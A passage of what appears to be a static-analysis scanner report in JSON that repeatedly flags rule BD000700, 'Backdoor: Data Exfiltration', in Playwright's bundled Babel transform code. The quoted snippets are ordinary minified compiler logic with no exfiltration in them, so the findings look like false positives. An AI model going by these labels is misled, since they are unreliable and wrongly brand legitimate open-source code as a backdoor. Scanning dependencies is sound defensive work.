                    "text": "nt variable to show the loaded configuration:\n\tnpx cross-env BABEL_SHOW_CONFIG_FOR=${t} <your build command>\nSee https://babeljs.io/docs/configuration#print-effective-configs for more info.`}function Jn(e,t){return!!(e.get(BE)&t)}function jE(e,t){return!!(e.get(xl)&t)}function np(e,t,r){r?e.set(xl,e.get(xl)|t):e.set(xl,e.get(xl)&~t),e.set(Fs,e.get(Fs)&~t)}function MEe(e,t){let r=null,n=null,s=null,i=null,a=null;(0,i_.hasOwnDecorators)(e.node)&&(r=e.get(\"decorators.0\"));for(let o of e.get(\"body.body\"))!r&&(0,i_.hasOwnDecorators)(o.node)&&(r=o.get(\"decorators.0\")),!n&&o.isClassProperty()&&(n=o),!s&&o",
                    "rendered": {
                      "text": "nt variable to show the loaded configuration:\n\tnpx cross-env BABEL_SHOW_CONFIG_FOR=${t} <your build command>\nSee https://babeljs.io/docs/configuration#print-effective-configs for more info.`}function Jn(e,t){return!!(e.get(BE)&t)}function jE(e,t){return!!(e.get(xl)&t)}function np(e,t,r){r?e.set(xl,e.get(xl)|t):e.set(xl,e.get(xl)&~t),e.set(Fs,e.get(Fs)&~t)}function MEe(e,t){let r=null,n=null,s=null,i=null,a=null;(0,i_.hasOwnDecorators)(e.node)&&(r=e.get(\"decorators.0\"));for(let o of e.get(\"body.body\"))!r&&(0,i_.hasOwnDecorators)(o.node)&&(r=o.get(\"decorators.0\")),!n&&o.isClassProperty()&&(n=o),!s&&o",
                      "markdown": "`nt variable to show the loaded configuration:\n\tnpx cross-env BABEL_SHOW_CONFIG_FOR=${t} <your build command>\nSee https://babeljs.io/docs/configuration#print-effective-configs for more info.`}function Jn(e,t){return!!(e.get(BE)&t)}function jE(e,t){return!!(e.get(xl)&t)}function np(e,t,r){r?e.set(xl,e.get(xl)|t):e.set(xl,e.get(xl)&~t),e.set(Fs,e.get(Fs)&~t)}function MEe(e,t){let r=null,n=null,s=null,i=null,a=null;(0,i_.hasOwnDecorators)(e.node)&&(r=e.get(\"decorators.0\"));for(let o of e.get(\"body.body\"))!r&&(0,i_.hasOwnDecorators)(o.node)&&(r=o.get(\"decorators.0\")),!n&&o.isClassProperty()&&(n=o),!s&&o`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1888,
                  "startColumn": 148,
                  "endLine": 1888,
                  "endColumn": 153,
                  "snippet": {
                    "text": "el with the BABEL_SHOW_CONFIG_FOR environment variable to show the loaded configuration:\n\tnpx cross-env BABEL_SHOW_CONFIG_FOR=${t} <your build command>\nSee https://babeljs.io/docs/configuration#print-effective-configs for more info.`}function Jn(e,t){return!!(e.get(BE)&t)}function jE(e,t){return!!(e.get(xl)&t)}function np(e,t,r){r?e.set(xl,e.get(xl)|t):e.set(xl,e.get(xl)&~t),e.set(Fs,e.get(Fs)&~t)}function MEe(e,t){let r=null,n=null,s=null,i=null,a=null;(0,i_.hasOwnDecorators)(e.node)&&(r=e.get(\"decorators.0\"));for(let o of e.get(\"body.body\"))!r&&(0,i_.hasOwnDecorators)(o.node)&&(r=o.get(\"decorator",
                    "rendered": {
                      "text": "el with the BABEL_SHOW_CONFIG_FOR environment variable to show the loaded configuration:\n\tnpx cross-env BABEL_SHOW_CONFIG_FOR=${t} <your build command>\nSee https://babeljs.io/docs/configuration#print-effective-configs for more info.`}function Jn(e,t){return!!(e.get(BE)&t)}function jE(e,t){return!!(e.get(xl)&t)}function np(e,t,r){r?e.set(xl,e.get(xl)|t):e.set(xl,e.get(xl)&~t),e.set(Fs,e.get(Fs)&~t)}function MEe(e,t){let r=null,n=null,s=null,i=null,a=null;(0,i_.hasOwnDecorators)(e.node)&&(r=e.get(\"decorators.0\"));for(let o of e.get(\"body.body\"))!r&&(0,i_.hasOwnDecorators)(o.node)&&(r=o.get(\"decorator",
                      "markdown": "`el with the BABEL_SHOW_CONFIG_FOR environment variable to show the loaded configuration:\n\tnpx cross-env BABEL_SHOW_CONFIG_FOR=${t} <your build command>\nSee https://babeljs.io/docs/configuration#print-effective-configs for more info.`}function Jn(e,t){return!!(e.get(BE)&t)}function jE(e,t){return!!(e.get(xl)&t)}function np(e,t,r){r?e.set(xl,e.get(xl)|t):e.set(xl,e.get(xl)&~t),e.set(Fs,e.get(Fs)&~t)}function MEe(e,t){let r=null,n=null,s=null,i=null,a=null;(0,i_.hasOwnDecorators)(e.node)&&(r=e.get(\"decorators.0\"));for(let o of e.get(\"body.body\"))!r&&(0,i_.hasOwnDecorators)(o.node)&&(r=o.get(\"decorator`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1888,
                  "startColumn": 109,
                  "endLine": 1888,
                  "endColumn": 114,
                  "snippet": {
                    "text": "h different options.\nYou can re-run Babel with the BABEL_SHOW_CONFIG_FOR environment variable to show the loaded configuration:\n\tnpx cross-env BABEL_SHOW_CONFIG_FOR=${t} <your build command>\nSee https://babeljs.io/docs/configuration#print-effective-configs for more info.`}function Jn(e,t){return!!(e.get(BE)&t)}function jE(e,t){return!!(e.get(xl)&t)}function np(e,t,r){r?e.set(xl,e.get(xl)|t):e.set(xl,e.get(xl)&~t),e.set(Fs,e.get(Fs)&~t)}function MEe(e,t){let r=null,n=null,s=null,i=null,a=null;(0,i_.hasOwnDecorators)(e.node)&&(r=e.get(\"decorators.0\"));for(let o of e.get(\"body.body\"))!r&&(0,i_.hasOwnD",
                    "rendered": {
                      "text": "h different options.\nYou can re-run Babel with the BABEL_SHOW_CONFIG_FOR environment variable to show the loaded configuration:\n\tnpx cross-env BABEL_SHOW_CONFIG_FOR=${t} <your build command>\nSee https://babeljs.io/docs/configuration#print-effective-configs for more info.`}function Jn(e,t){return!!(e.get(BE)&t)}function jE(e,t){return!!(e.get(xl)&t)}function np(e,t,r){r?e.set(xl,e.get(xl)|t):e.set(xl,e.get(xl)&~t),e.set(Fs,e.get(Fs)&~t)}function MEe(e,t){let r=null,n=null,s=null,i=null,a=null;(0,i_.hasOwnDecorators)(e.node)&&(r=e.get(\"decorators.0\"));for(let o of e.get(\"body.body\"))!r&&(0,i_.hasOwnD",
                      "markdown": "`h different options.\nYou can re-run Babel with the BABEL_SHOW_CONFIG_FOR environment variable to show the loaded configuration:\n\tnpx cross-env BABEL_SHOW_CONFIG_FOR=${t} <your build command>\nSee https://babeljs.io/docs/configuration#print-effective-configs for more info.`}function Jn(e,t){return!!(e.get(BE)&t)}function jE(e,t){return!!(e.get(xl)&t)}function np(e,t,r){r?e.set(xl,e.get(xl)|t):e.set(xl,e.get(xl)&~t),e.set(Fs,e.get(Fs)&~t)}function MEe(e,t){let r=null,n=null,s=null,i=null,a=null;(0,i_.hasOwnDecorators)(e.node)&&(r=e.get(\"decorators.0\"));for(let o of e.get(\"body.body\"))!r&&(0,i_.hasOwnD`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1878,
                  "startColumn": 1098,
                  "endLine": 1878,
                  "endColumn": 1103,
                  "snippet": {
                    "text": "unction LEe(e,t,r){(!Jn(e,t)||FE(e,t))&&(e.set(BE,e.get(BE)|t),r===\"#__internal__@babel/preset-env__prefer-true-but-false-is-ok-if-it-prevents-an-error\"?(np(e,t,!0),e.set(Fs,e.get(Fs)|t)):r===\"#__internal__@babel/preset-env__prefer-false-but-true-is-ok-if-it-prevents-an-error\"?(np(e,t,!1),e.set(Fs,e.get(Fs)|t)):np(e,t,r));let n;for(let[i,a]of a_){if(!Jn(e,i)||FE(e,i))continue;let o=jE(e,i);if(n===!o)throw new Error(`'loose' mode configuration must be the same for @babel/plugin-transform-class-properties, @babel/plugin-transform-private-methods and @babel/plugin-transform-private-property-in-object ",
                    "rendered": {
                      "text": "unction LEe(e,t,r){(!Jn(e,t)||FE(e,t))&&(e.set(BE,e.get(BE)|t),r===\"#__internal__@babel/preset-env__prefer-true-but-false-is-ok-if-it-prevents-an-error\"?(np(e,t,!0),e.set(Fs,e.get(Fs)|t)):r===\"#__internal__@babel/preset-env__prefer-false-but-true-is-ok-if-it-prevents-an-error\"?(np(e,t,!1),e.set(Fs,e.get(Fs)|t)):np(e,t,r));let n;for(let[i,a]of a_){if(!Jn(e,i)||FE(e,i))continue;let o=jE(e,i);if(n===!o)throw new Error(`'loose' mode configuration must be the same for @babel/plugin-transform-class-properties, @babel/plugin-transform-private-methods and @babel/plugin-transform-private-property-in-object ",
                      "markdown": "`unction LEe(e,t,r){(!Jn(e,t)||FE(e,t))&&(e.set(BE,e.get(BE)|t),r===\"#__internal__@babel/preset-env__prefer-true-but-false-is-ok-if-it-prevents-an-error\"?(np(e,t,!0),e.set(Fs,e.get(Fs)|t)):r===\"#__internal__@babel/preset-env__prefer-false-but-true-is-ok-if-it-prevents-an-error\"?(np(e,t,!1),e.set(Fs,e.get(Fs)|t)):np(e,t,r));let n;for(let[i,a]of a_){if(!Jn(e,i)||FE(e,i))continue;let o=jE(e,i);if(n===!o)throw new Error(`'loose' mode configuration must be the same for @babel/plugin-transform-class-properties, @babel/plugin-transform-private-methods and @babel/plugin-transform-private-property-in-object `"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1878,
                  "startColumn": 973,
                  "endLine": 1878,
                  "endColumn": 978,
                  "snippet": {
                    "text": "ernal__@babel/preset-env__please-overwrite-loose-instead-of-throwing\";var Fs;FE=function(e,t){return!!(e.get(Fs)&t)};var FE;function LEe(e,t,r){(!Jn(e,t)||FE(e,t))&&(e.set(BE,e.get(BE)|t),r===\"#__internal__@babel/preset-env__prefer-true-but-false-is-ok-if-it-prevents-an-error\"?(np(e,t,!0),e.set(Fs,e.get(Fs)|t)):r===\"#__internal__@babel/preset-env__prefer-false-but-true-is-ok-if-it-prevents-an-error\"?(np(e,t,!1),e.set(Fs,e.get(Fs)|t)):np(e,t,r));let n;for(let[i,a]of a_){if(!Jn(e,i)||FE(e,i))continue;let o=jE(e,i);if(n===!o)throw new Error(`'loose' mode configuration must be the same for @babel/plugi",
                    "rendered": {
                      "text": "ernal__@babel/preset-env__please-overwrite-loose-instead-of-throwing\";var Fs;FE=function(e,t){return!!(e.get(Fs)&t)};var FE;function LEe(e,t,r){(!Jn(e,t)||FE(e,t))&&(e.set(BE,e.get(BE)|t),r===\"#__internal__@babel/preset-env__prefer-true-but-false-is-ok-if-it-prevents-an-error\"?(np(e,t,!0),e.set(Fs,e.get(Fs)|t)):r===\"#__internal__@babel/preset-env__prefer-false-but-true-is-ok-if-it-prevents-an-error\"?(np(e,t,!1),e.set(Fs,e.get(Fs)|t)):np(e,t,r));let n;for(let[i,a]of a_){if(!Jn(e,i)||FE(e,i))continue;let o=jE(e,i);if(n===!o)throw new Error(`'loose' mode configuration must be the same for @babel/plugi",
                      "markdown": "`ernal__@babel/preset-env__please-overwrite-loose-instead-of-throwing\";var Fs;FE=function(e,t){return!!(e.get(Fs)&t)};var FE;function LEe(e,t,r){(!Jn(e,t)||FE(e,t))&&(e.set(BE,e.get(BE)|t),r===\"#__internal__@babel/preset-env__prefer-true-but-false-is-ok-if-it-prevents-an-error\"?(np(e,t,!0),e.set(Fs,e.get(Fs)|t)):r===\"#__internal__@babel/preset-env__prefer-false-but-true-is-ok-if-it-prevents-an-error\"?(np(e,t,!1),e.set(Fs,e.get(Fs)|t)):np(e,t,r));let n;for(let[i,a]of a_){if(!Jn(e,i)||FE(e,i))continue;let o=jE(e,i);if(n===!o)throw new Error(`'loose' mode configuration must be the same for @babel/plugi`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1878,
                  "startColumn": 849,
                  "endLine": 1878,
                  "endColumn": 854,
                  "snippet": {
                    "text": "features/featuresKey\",xl=\"@babel/plugin-class-features/looseKey\";Fs=\"@babel/plugin-class-features/looseLowPriorityKey/#__internal__@babel/preset-env__please-overwrite-loose-instead-of-throwing\";var Fs;FE=function(e,t){return!!(e.get(Fs)&t)};var FE;function LEe(e,t,r){(!Jn(e,t)||FE(e,t))&&(e.set(BE,e.get(BE)|t),r===\"#__internal__@babel/preset-env__prefer-true-but-false-is-ok-if-it-prevents-an-error\"?(np(e,t,!0),e.set(Fs,e.get(Fs)|t)):r===\"#__internal__@babel/preset-env__prefer-false-but-true-is-ok-if-it-prevents-an-error\"?(np(e,t,!1),e.set(Fs,e.get(Fs)|t)):np(e,t,r));let n;for(let[i,a]of a_){if(!Jn(",
                    "rendered": {
                      "text": "features/featuresKey\",xl=\"@babel/plugin-class-features/looseKey\";Fs=\"@babel/plugin-class-features/looseLowPriorityKey/#__internal__@babel/preset-env__please-overwrite-loose-instead-of-throwing\";var Fs;FE=function(e,t){return!!(e.get(Fs)&t)};var FE;function LEe(e,t,r){(!Jn(e,t)||FE(e,t))&&(e.set(BE,e.get(BE)|t),r===\"#__internal__@babel/preset-env__prefer-true-but-false-is-ok-if-it-prevents-an-error\"?(np(e,t,!0),e.set(Fs,e.get(Fs)|t)):r===\"#__internal__@babel/preset-env__prefer-false-but-true-is-ok-if-it-prevents-an-error\"?(np(e,t,!1),e.set(Fs,e.get(Fs)|t)):np(e,t,r));let n;for(let[i,a]of a_){if(!Jn(",
                      "markdown": "`features/featuresKey\",xl=\"@babel/plugin-class-features/looseKey\";Fs=\"@babel/plugin-class-features/looseLowPriorityKey/#__internal__@babel/preset-env__please-overwrite-loose-instead-of-throwing\";var Fs;FE=function(e,t){return!!(e.get(Fs)&t)};var FE;function LEe(e,t,r){(!Jn(e,t)||FE(e,t))&&(e.set(BE,e.get(BE)|t),r===\"#__internal__@babel/preset-env__prefer-true-but-false-is-ok-if-it-prevents-an-error\"?(np(e,t,!0),e.set(Fs,e.get(Fs)|t)):r===\"#__internal__@babel/preset-env__prefer-false-but-true-is-ok-if-it-prevents-an-error\"?(np(e,t,!1),e.set(Fs,e.get(Fs)|t)):np(e,t,r));let n;for(let[i,a]of a_){if(!Jn(`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1878,
                  "startColumn": 777,
                  "endLine": 1878,
                  "endColumn": 782,
                  "snippet": {
                    "text": "plugin-transform-private-property-in-object\"]]),BE=\"@babel/plugin-class-features/featuresKey\",xl=\"@babel/plugin-class-features/looseKey\";Fs=\"@babel/plugin-class-features/looseLowPriorityKey/#__internal__@babel/preset-env__please-overwrite-loose-instead-of-throwing\";var Fs;FE=function(e,t){return!!(e.get(Fs)&t)};var FE;function LEe(e,t,r){(!Jn(e,t)||FE(e,t))&&(e.set(BE,e.get(BE)|t),r===\"#__internal__@babel/preset-env__prefer-true-but-false-is-ok-if-it-prevents-an-error\"?(np(e,t,!0),e.set(Fs,e.get(Fs)|t)):r===\"#__internal__@babel/preset-env__prefer-false-but-true-is-ok-if-it-prevents-an-error\"?(np(e,",
                    "rendered": {
                      "text": "plugin-transform-private-property-in-object\"]]),BE=\"@babel/plugin-class-features/featuresKey\",xl=\"@babel/plugin-class-features/looseKey\";Fs=\"@babel/plugin-class-features/looseLowPriorityKey/#__internal__@babel/preset-env__please-overwrite-loose-instead-of-throwing\";var Fs;FE=function(e,t){return!!(e.get(Fs)&t)};var FE;function LEe(e,t,r){(!Jn(e,t)||FE(e,t))&&(e.set(BE,e.get(BE)|t),r===\"#__internal__@babel/preset-env__prefer-true-but-false-is-ok-if-it-prevents-an-error\"?(np(e,t,!0),e.set(Fs,e.get(Fs)|t)):r===\"#__internal__@babel/preset-env__prefer-false-but-true-is-ok-if-it-prevents-an-error\"?(np(e,",
                      "markdown": "`plugin-transform-private-property-in-object\"]]),BE=\"@babel/plugin-class-features/featuresKey\",xl=\"@babel/plugin-class-features/looseKey\";Fs=\"@babel/plugin-class-features/looseLowPriorityKey/#__internal__@babel/preset-env__please-overwrite-loose-instead-of-throwing\";var Fs;FE=function(e,t){return!!(e.get(Fs)&t)};var FE;function LEe(e,t,r){(!Jn(e,t)||FE(e,t))&&(e.set(BE,e.get(BE)|t),r===\"#__internal__@babel/preset-env__prefer-true-but-false-is-ok-if-it-prevents-an-error\"?(np(e,t,!0),e.set(Fs,e.get(Fs)|t)):r===\"#__internal__@babel/preset-env__prefer-false-but-true-is-ok-if-it-prevents-an-error\"?(np(e,`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1878,
                  "startColumn": 47,
                  "endLine": 1878,
                  "endColumn": 52,
                  "snippet": {
                    "text": "irective(Tt.types.directiveLiteral(\"use strict\")));let b=m,d=\"arguments.1.body.body.0\";return o&&(b=Tt.template.statement.ast`let ${e} = ${m}`,d=\"declarations.0.init.\"+d),{instanceNodes:[Tt.template.statement.ast`\n        ${Tt.types.cloneNode(a)}(this)\n      `],wrapClass(y){return y.replaceWith(b),y.get(d)}}}});var l_=E(Si=>{\"use strict\";Object.defineProperty(Si,\"__esModule\",{value:!0});Si.FEATURES=void 0;Si.enableFeature=LEe;Si.isLoose=jE;Si.shouldTransform=MEe;var i_=kE(),Xn=Si.FEATURES=Object.freeze({fields:2,privateMethods:4,decorators:8,privateIn:16,staticBlocks:32}),a_=new Map([[Xn.fields,\"@b",
                    "rendered": {
                      "text": "irective(Tt.types.directiveLiteral(\"use strict\")));let b=m,d=\"arguments.1.body.body.0\";return o&&(b=Tt.template.statement.ast`let ${e} = ${m}`,d=\"declarations.0.init.\"+d),{instanceNodes:[Tt.template.statement.ast`\n        ${Tt.types.cloneNode(a)}(this)\n      `],wrapClass(y){return y.replaceWith(b),y.get(d)}}}});var l_=E(Si=>{\"use strict\";Object.defineProperty(Si,\"__esModule\",{value:!0});Si.FEATURES=void 0;Si.enableFeature=LEe;Si.isLoose=jE;Si.shouldTransform=MEe;var i_=kE(),Xn=Si.FEATURES=Object.freeze({fields:2,privateMethods:4,decorators:8,privateIn:16,staticBlocks:32}),a_=new Map([[Xn.fields,\"@b",
                      "markdown": "`irective(Tt.types.directiveLiteral(\"use strict\")));let b=m,d=\"arguments.1.body.body.0\";return o&&(b=Tt.template.statement.ast`let ${e} = ${m}`,d=\"declarations.0.init.\"+d),{instanceNodes:[Tt.template.statement.ast`\n        ${Tt.types.cloneNode(a)}(this)\n      `],wrapClass(y){return y.replaceWith(b),y.get(d)}}}});var l_=E(Si=>{\"use strict\";Object.defineProperty(Si,\"__esModule\",{value:!0});Si.FEATURES=void 0;Si.enableFeature=LEe;Si.isLoose=jE;Si.shouldTransform=MEe;var i_=kE(),Xn=Si.FEATURES=Object.freeze({fields:2,privateMethods:4,decorators:8,privateIn:16,staticBlocks:32}),a_=new Map([[Xn.fields,\"@b`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1867,
                  "startColumn": 5964,
                  "endLine": 1867,
                  "endColumn": 5969,
                  "snippet": {
                    "text": "(i.computed){let l=r(n,a,s);t(o,s,l)}else if(a.type===\"Identifier\")t(o,s,a.name);else if(a.type===\"PrivateName\"){let l=A.types.stringLiteral(\"#\"+a.id.name);t(o,s,l)}else{let l=A.types.stringLiteral(a.value+\"\");t(o,s,l)}},ClassProperty(n,s){let{node:i}=n,a=i.key,o=(0,Ns.skipTransparentExprWrappers)(n.get(\"value\"));if(e(o))if(i.computed){let l=r(n,a,s);t(o,s,l)}else if(a.type===\"Identifier\")t(o,s,a.name);else{let l=A.types.stringLiteral(a.value+\"\");t(o,s,l)}}}}function wEe(e){return e.isClassExpression({id:null})&&AEe(e.node)}function _r(e,t){let r=e.generateUidIdentifier(t);return e.push({id:r,kind:",
                    "rendered": {
                      "text": "(i.computed){let l=r(n,a,s);t(o,s,l)}else if(a.type===\"Identifier\")t(o,s,a.name);else if(a.type===\"PrivateName\"){let l=A.types.stringLiteral(\"#\"+a.id.name);t(o,s,l)}else{let l=A.types.stringLiteral(a.value+\"\");t(o,s,l)}},ClassProperty(n,s){let{node:i}=n,a=i.key,o=(0,Ns.skipTransparentExprWrappers)(n.get(\"value\"));if(e(o))if(i.computed){let l=r(n,a,s);t(o,s,l)}else if(a.type===\"Identifier\")t(o,s,a.name);else{let l=A.types.stringLiteral(a.value+\"\");t(o,s,l)}}}}function wEe(e){return e.isClassExpression({id:null})&&AEe(e.node)}function _r(e,t){let r=e.generateUidIdentifier(t);return e.push({id:r,kind:",
                      "markdown": "`(i.computed){let l=r(n,a,s);t(o,s,l)}else if(a.type===\"Identifier\")t(o,s,a.name);else if(a.type===\"PrivateName\"){let l=A.types.stringLiteral(\"#\"+a.id.name);t(o,s,l)}else{let l=A.types.stringLiteral(a.value+\"\");t(o,s,l)}},ClassProperty(n,s){let{node:i}=n,a=i.key,o=(0,Ns.skipTransparentExprWrappers)(n.get(\"value\"));if(e(o))if(i.computed){let l=r(n,a,s);t(o,s,l)}else if(a.type===\"Identifier\")t(o,s,a.name);else{let l=A.types.stringLiteral(a.value+\"\");t(o,s,l)}}}}function wEe(e){return e.isClassExpression({id:null})&&AEe(e.node)}function _r(e,t){let r=e.generateUidIdentifier(t);return e.push({id:r,kind:`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1867,
                  "startColumn": 5639,
                  "endLine": 1867,
                  "endColumn": 5644,
                  "snippet": {
                    "text": "let u=A.types.stringLiteral(o.value+\"\");t(l,s,u)}}}},ClassPrivateProperty(n,s){let{node:i}=n,a=(0,Ns.skipTransparentExprWrappers)(n.get(\"value\"));if(e(a)){let o=A.types.stringLiteral(\"#\"+i.key.id.name);t(a,s,o)}},ClassAccessorProperty(n,s){let{node:i}=n,a=i.key,o=(0,Ns.skipTransparentExprWrappers)(n.get(\"value\"));if(e(o))if(i.computed){let l=r(n,a,s);t(o,s,l)}else if(a.type===\"Identifier\")t(o,s,a.name);else if(a.type===\"PrivateName\"){let l=A.types.stringLiteral(\"#\"+a.id.name);t(o,s,l)}else{let l=A.types.stringLiteral(a.value+\"\");t(o,s,l)}},ClassProperty(n,s){let{node:i}=n,a=i.key,o=(0,Ns.skipTransp",
                    "rendered": {
                      "text": "let u=A.types.stringLiteral(o.value+\"\");t(l,s,u)}}}},ClassPrivateProperty(n,s){let{node:i}=n,a=(0,Ns.skipTransparentExprWrappers)(n.get(\"value\"));if(e(a)){let o=A.types.stringLiteral(\"#\"+i.key.id.name);t(a,s,o)}},ClassAccessorProperty(n,s){let{node:i}=n,a=i.key,o=(0,Ns.skipTransparentExprWrappers)(n.get(\"value\"));if(e(o))if(i.computed){let l=r(n,a,s);t(o,s,l)}else if(a.type===\"Identifier\")t(o,s,a.name);else if(a.type===\"PrivateName\"){let l=A.types.stringLiteral(\"#\"+a.id.name);t(o,s,l)}else{let l=A.types.stringLiteral(a.value+\"\");t(o,s,l)}},ClassProperty(n,s){let{node:i}=n,a=i.key,o=(0,Ns.skipTransp",
                      "markdown": "`let u=A.types.stringLiteral(o.value+\"\");t(l,s,u)}}}},ClassPrivateProperty(n,s){let{node:i}=n,a=(0,Ns.skipTransparentExprWrappers)(n.get(\"value\"));if(e(a)){let o=A.types.stringLiteral(\"#\"+i.key.id.name);t(a,s,o)}},ClassAccessorProperty(n,s){let{node:i}=n,a=i.key,o=(0,Ns.skipTransparentExprWrappers)(n.get(\"value\"));if(e(o))if(i.computed){let l=r(n,a,s);t(o,s,l)}else if(a.type===\"Identifier\")t(o,s,a.name);else if(a.type===\"PrivateName\"){let l=A.types.stringLiteral(\"#\"+a.id.name);t(o,s,l)}else{let l=A.types.stringLiteral(a.value+\"\");t(o,s,l)}},ClassProperty(n,s){let{node:i}=n,a=i.key,o=(0,Ns.skipTransp`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1867,
                  "startColumn": 5470,
                  "endLine": 1867,
                  "endColumn": 5475,
                  "snippet": {
                    "text": "o=a.key,l=(0,Ns.skipTransparentExprWrappers)(i.get(\"value\"));if(e(l)){if(a.computed){let u=r(i,o,s);t(l,s,u)}else if(!xEe(o))if(o.type===\"Identifier\")t(l,s,o.name);else{let u=A.types.stringLiteral(o.value+\"\");t(l,s,u)}}}},ClassPrivateProperty(n,s){let{node:i}=n,a=(0,Ns.skipTransparentExprWrappers)(n.get(\"value\"));if(e(a)){let o=A.types.stringLiteral(\"#\"+i.key.id.name);t(a,s,o)}},ClassAccessorProperty(n,s){let{node:i}=n,a=i.key,o=(0,Ns.skipTransparentExprWrappers)(n.get(\"value\"));if(e(o))if(i.computed){let l=r(n,a,s);t(o,s,l)}else if(a.type===\"Identifier\")t(o,s,a.name);else if(a.type===\"PrivateName\"",
                    "rendered": {
                      "text": "o=a.key,l=(0,Ns.skipTransparentExprWrappers)(i.get(\"value\"));if(e(l)){if(a.computed){let u=r(i,o,s);t(l,s,u)}else if(!xEe(o))if(o.type===\"Identifier\")t(l,s,o.name);else{let u=A.types.stringLiteral(o.value+\"\");t(l,s,u)}}}},ClassPrivateProperty(n,s){let{node:i}=n,a=(0,Ns.skipTransparentExprWrappers)(n.get(\"value\"));if(e(a)){let o=A.types.stringLiteral(\"#\"+i.key.id.name);t(a,s,o)}},ClassAccessorProperty(n,s){let{node:i}=n,a=i.key,o=(0,Ns.skipTransparentExprWrappers)(n.get(\"value\"));if(e(o))if(i.computed){let l=r(n,a,s);t(o,s,l)}else if(a.type===\"Identifier\")t(o,s,a.name);else if(a.type===\"PrivateName\"",
